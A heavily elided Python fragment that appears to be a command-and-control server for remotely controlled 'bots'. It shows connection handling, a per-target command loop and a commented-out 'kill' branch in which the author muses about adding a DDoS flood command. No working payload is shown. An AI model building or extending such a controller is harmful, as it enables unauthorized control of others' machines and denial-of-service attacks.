...
class MultiServer(object):
    ...
    def accept_connections(self):
        ...
        while 1:
            ...
            print('\nSkid connected: {0} ({1})'.format(address[-1], address[0]))
        return
    ...
    def start_turtle(self):
      ...
      #      elif 'kill' in cmd:
     #           ddos, conn = ('ls')	Honistly wanted to add a send all commands thing or like a ddos thing that tells all the bots to flood but fuq dat
    #            if conn is not None:
   #                 self.send_target_commands(ddos, conn)
    ...
    def send_target_commands(self, target, conn):
        ...
        while True:
            try:
                ...
                print("Connection died! RIP asf. %s" %str(e))
                break
